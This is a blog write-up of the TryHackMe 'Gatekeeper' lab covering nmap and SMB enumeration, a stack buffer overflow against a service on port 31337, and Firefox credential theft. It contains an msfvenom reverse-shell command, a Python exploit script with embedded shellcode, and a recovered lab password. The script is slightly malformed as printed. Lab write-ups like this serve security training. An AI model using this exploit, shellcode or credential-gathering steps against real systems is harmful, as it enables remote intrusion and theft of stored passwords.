---
title: "Gatekeeper Writeup THM"
description: "My writeup of the TryHackMe room [Gatekeeper](https://tryhackme.com/room/gatekeeper)"
date: 2024-01-03T16:00:00+01:00
image: https://images.unsplash.com/photo-1580047750144-2c7790adf461?q=80&w=2670&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Windows
    - Privilege Escalation
    - Buffer Overflow
categories:
    - Room
    - Medium
---

First of all we do a nmap scan:

```bash
nmap 10.10.211.241
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 08:03 EST
Nmap scan report for 10.10.211.241
Host is up (0.058s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
31337/tcp open  Elite
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49161/tcp open  unknown
49167/tcp open  unknown
```

First of all I am going to enumerate SAMBA

```bash
smbclient -L 10.10.211.241

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk

smbclient //10.10.211.241/Users
smb: \> ls
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020

                7863807 blocks of size 4096. 3876514 blocks available
```

In the share directory I have found an exe file, which I am going to transfer in my windows machine.

I setted up my windows machine with Immunity Debugger+ mona.py, and I wrote a script to gain inital access.

I found the offset by writing in the prompt the output of this command:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
```

Then after the crash I wrote in the immunity prompt

```bash
!mona findmsp -distance 700
```

The results will give you the offset.

I found out the bad chars and jump point with mona too.

msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<badchars>" -f c

I then added some NOPs and wrote this python script:

```bash
import socket

ip = "10.10.98.109"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\xdb\xd4\xbb\xde\xb4\xa5\xcc\xd9\x74\x24\xf4\x58\x29\xc9"
"\xb1\x52\x31\x58\x17\x03\x58\x17\x83\x1e\xb0\x47\x39\x62"
"\x51\x05\xc2\x9a\xa2\x6a\x4a\x7f\x93\xaa\x28\xf4\x84\x1a"
"\x3a\x58\x29\xd0\x6e\x48\xba\x94\xa6\x7f\x0b\x12\x91\x4e"
"\x8c\x0f\xe1\xd1\x0e\x52\x36\x31\x2e\x9d\x4b\x30\x77\xc0"
"\xa6\x60\x20\x8e\x15\x94\x45\xda\xa5\x1f\x15\xca\xad\xfc"
"\xee\xed\x9c\x53\x64\xb4\x3e\x52\xa9\xcc\x76\x4c\xae\xe9"
"\xc1\xe7\x04\x85\xd3\x21\x55\x66\x7f\x0c\x59\x95\x81\x49"
"\x5e\x46\xf4\xa3\x9c\xfb\x0f\x70\xde\x27\x85\x62\x78\xa3"
"\x3d\x4e\x78\x60\xdb\x05\x76\xcd\xaf\x41\x9b\xd0\x7c\xfa"
"\xa7\x59\x83\x2c\x2e\x19\xa0\xe8\x6a\xf9\xc9\xa9\xd6\xac"
"\xf6\xa9\xb8\x11\x53\xa2\x55\x45\xee\xe9\x31\xaa\xc3\x11"
"\xc2\xa4\x54\x62\xf0\x6b\xcf\xec\xb8\xe4\xc9\xeb\xbf\xde"
"\xae\x63\x3e\xe1\xce\xaa\x85\xb5\x9e\xc4\x2c\xb6\x74\x14"
"\xd0\x63\xda\x44\x7e\xdc\x9b\x34\x3e\x8c\x73\x5e\xb1\xf3"
"\x64\x61\x1b\x9c\x0f\x98\xcc\xa9\xdd\xb6\x78\xc6\xe3\xb6"
"\x91\x4a\x6d\x50\xfb\x62\x3b\xcb\x94\x1b\x66\x87\x05\xe3"
"\xbc\xe2\x06\x6f\x33\x13\xc8\x98\x3e\x07\xbd\x68\x75\x75"
"\x68\x76\xa3\x11\xf6\xe5\x28\xe1\x71\x16\xe7\xb6\xd6\xe8"
"\xfe\x52\xcb\x53\xa9\x40\x16\x05\x92\xc0\xcd\xf6\x1d\xc9"
"\x80\x43\x3a\xd9\x5c\x4b\x06\x8d\x30\x1a\xd0\x7b\xf7\xf4"
"\x92\xd5\xa1\xab\x7c\xb1\x34\x80\xbe\xc7\x38\xcd\x48\x27"
"\x88\xb8\x0c\x58\x25\x2d\x99\x21\x5b\xcd\x66\xf8\xdf\xed"
"\x84\x28\x2a\x86\x10\xb9\x97\xcb\xa2\x14\xdb\xf5\x20\x9c"
"\xa4\x01\x38\xd5\xa1\x4e\xfe\x06\xd8\xdf\x6b\x28\x4f\xdf"
"\xb9")
postfix = ""

buffer =  overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
    s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
```

After gaining initial access and wondering around a bit I noticed that the only possible thing to do would be getting credentials from Firefox, I used the metasploit tool `post/multi/gather/firefox_creds`

After that I ran firefox_decrypt and got the username and password:

```bash
python3 firefox_decrypt.py  firefox/loot

2024-01-03 10:00:37,134 - WARNING - profile.ini not found in firefox/loot
2024-01-03 10:00:37,134 - WARNING - Continuing and assuming 'firefox/loot' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
```
